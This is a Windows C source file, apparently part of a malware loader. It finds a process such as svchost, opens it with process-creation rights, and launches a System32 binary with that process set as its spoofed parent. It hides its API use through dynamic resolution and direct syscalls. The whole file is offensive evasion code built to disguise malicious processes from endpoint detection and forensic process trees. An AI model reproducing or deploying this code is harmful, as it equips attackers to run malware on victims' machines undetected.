#include "common.h"
#include "syscalls.h"

BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessID)
{
	// Dynamic Links
	f_CreateToolhelp32Snapshot rCreateToolhelp32Snapshot = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "CreateToolhelp32Snapshot");
	f_Process32First rProcess32First = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "Process32First");
	f_Process32Next rProcess32Next = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "Process32Next");
	f_OpenProcess rOpenProcess = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "OpenProcess");

	// Get process snapshot
	HANDLE hProcSnapshot = NULL;
	PROCESSENTRY32 pProcess = { .dwSize = sizeof(PROCESSENTRY32) };
	hProcSnapshot = rCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);


	rProcess32First(hProcSnapshot, &pProcess);
	// Get parent handle
	HANDLE hTest = NULL;
	do {
		// Lower process name
		for (int i = 0; pProcess.szExeFile[i]; i++) {
			pProcess.szExeFile[i] = tolower(pProcess.szExeFile[i]);
		}
		// Check if svchost
		if (strcmp(pProcess.szExeFile, sProcessName) == 0 && pProcess.th32ProcessID > 1000) {

			// Try opening a handle with necessary perms for spoofing
			hTest = rOpenProcess(PROCESS_CREATE_PROCESS, NULL, pProcess.th32ProcessID);
			if (hTest != NULL)
			{
				*hParent = hTest;
				*dwProcessID = pProcess.th32ProcessID;
				return EXIT_SUCCESS;
			}
		}
	} while (rProcess32Next(hProcSnapshot, &pProcess));

	return EXIT_FAILURE;
}

BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
{
	// Dynamic Links
	f_GetEnvironmentVariableA rGetEnvironmentVariableA = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "GetEnvironmentVariableA");
	f_CreateProcessA rCreateProcessA = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "CreateProcessA");

	// Inits
	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];
	CHAR lpWorkPath[MAX_PATH];
	SIZE_T sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;
	STARTUPINFOEXA SiEx = { 0 };
	PROCESS_INFORMATION Pi = { 0 };

	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Create spoofed path
	rGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH);
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	sprintf(lpWorkPath, "%s\\System32\\", WnDr);

	// First call for init
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
	// Allocate memory for thread list
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	// Second call for populating list
	InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList);
	// Update PPID
	UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);

	// Create process with spoofed params
	SiEx.lpAttributeList = pThreadAttList;

	rCreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		lpWorkPath,
		&SiEx.StartupInfo,
		&Pi
	);
	Sw3NtWaitForSingleObject(Pi.hThread, FALSE, 1000);

	// Returns and cleanup
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	return FALSE;
}
